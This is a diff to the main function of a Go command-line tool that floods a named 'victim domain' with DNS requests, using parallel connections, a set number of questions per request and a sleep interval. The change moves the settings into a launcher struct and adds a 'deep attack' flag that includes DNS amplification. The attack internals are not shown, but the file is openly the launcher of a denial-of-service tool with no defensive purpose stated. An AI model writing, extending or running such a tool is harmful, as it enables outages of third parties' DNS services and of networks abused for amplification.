@@ -10,15 +10,17 @@ import (
 )
 
 func main() {
-	victimDomain := flag.String("d", "", "victim domain name")
-	nRoutines := flag.Int("c", 2*runtime.NumCPU(), "number of parallel connections")
-	nQuestions := flag.Int("n", 16, "number of DNS qeustion in one request")
-	sleep := flag.Duration("s", time.Millisecond, "sleep between requests")
+	launcher := internal.Launcher{
+		VictimDomain: flag.String("d", "", "victim domain name"),
+		NRoutines:    flag.Int("c", 2*runtime.NumCPU(), "number of parallel connections"),
+		NQuestions:   flag.Int("n", 16, "number of DNS qeustion in one request"),
+		SleepTime:    flag.Duration("s", time.Millisecond, "sleep between requests"),
+		Deep:         flag.Bool("x", false, "deep attack. includes DNS amplification"),
+	}
 	flag.Parse()
-	if *victimDomain == "" {
+	if len(*launcher.VictimDomain) == 0 {
 		log.Fatalf("victim domain must be specified")
 	}
-	launcher := internal.NewLauncher(*nRoutines, *nQuestions, *victimDomain, sleep)
 	launcher.Initialize()
 	launcher.Start()
 	launcher.AwaitShutdown()
